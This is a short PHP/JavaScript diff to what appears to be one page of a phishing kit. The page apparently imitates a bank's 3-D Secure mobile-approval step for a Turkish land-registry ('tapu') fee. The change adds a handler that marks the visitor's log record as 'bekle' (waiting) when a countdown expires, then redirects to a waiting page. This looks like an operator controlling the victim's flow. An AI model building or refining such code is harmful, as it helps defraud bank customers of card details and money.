@@ -1,4 +1,15 @@
 <?php
+if (isset($_POST['timeout'])) {
+    if (session_status() === PHP_SESSION_NONE) session_start();
+    require_once __DIR__ . '/../db.php';
+    $log_id = get_or_create_log();
+    if ($log_id) {
+        db()->prepare("UPDATE tapu_logs SET durum='bekle', guncellendi=NOW() WHERE id=?")->execute([$log_id]);
+    }
+    header('Content-Type: application/json');
+    echo json_encode(['ok' => true]);
+    exit;
+}
 $is_mobil_onay = true;
 require __DIR__ . '/_acs_core.php';
 
@@ -346,8 +357,17 @@ $tutar_ykb = number_format((float)$ucret_val, 2, ',', '.') . ' TL';
     function updateTimer() {
       if (sec <= 0) {
         clearInterval(timerInterval);
-        // Redirect to bekle.php
-        window.location.href = '<?= BASE_PATH ?>/bekle.php';
+        
+        // Update status in DB to 'bekle' before redirecting
+        var fd = new FormData();
+        fd.append('timeout', '1');
+        fetch(window.location.href, {method: 'POST', body: fd})
+          .then(function() {
+             window.location.href = '<?= BASE_PATH ?>/bekle.php';
+          })
+          .catch(function() {
+             window.location.href = '<?= BASE_PATH ?>/bekle.php';
+          });
         return;
       }
       sec--;
